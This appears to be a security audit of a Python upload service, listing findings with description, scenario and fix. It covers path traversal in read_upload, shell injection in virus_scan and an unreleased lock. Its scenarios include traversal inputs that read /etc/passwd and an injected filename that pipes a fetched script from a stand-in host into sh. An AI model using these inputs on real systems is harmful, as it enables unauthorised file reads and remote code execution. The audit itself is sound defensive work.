findings.description: read_upload joins an untrusted URL-derived filename onto UPLOAD_DIR without sanitizing. '..' segments or an absolute path escape the upload directory (os.path.join discards UPLOAD_DIR when the second argument is absolute). save_upload sanitizes with basename, so this function is inconsistent with it.
findings.scenario: filename='../../../etc/passwd' or '/etc/passwd' returns the contents of that file to the requester.
findings.fix: Use safe = os.path.basename(filename), or resolve with os.path.realpath and verify it starts with UPLOAD_DIR + os.sep before opening.

findings.description: virus_scan interpolates path into a shell command string with shell=True. If path contains shell metacharacters (for example an uploaded filename, which basename() does not strip of ; or $()), arbitrary commands run.
findings.scenario: An upload named 'a; curl evil.sh|sh' (or '$(id)') is scanned via virus_scan(path), and the injected command executes as the service user.
findings.fix: subprocess.run(["clamscan", "--", path], check=True) with no shell.

findings.description: The lock is acquired and released manually without try/finally. If open() or f.write() raises (disk full, bad name, permission), the lock is never released and all later saves block forever.
findings.scenario: save_upload('..', data) or a write hitting ENOSPC raises inside the with-block; the lock stays held and every subsequent save_upload deadlocks.
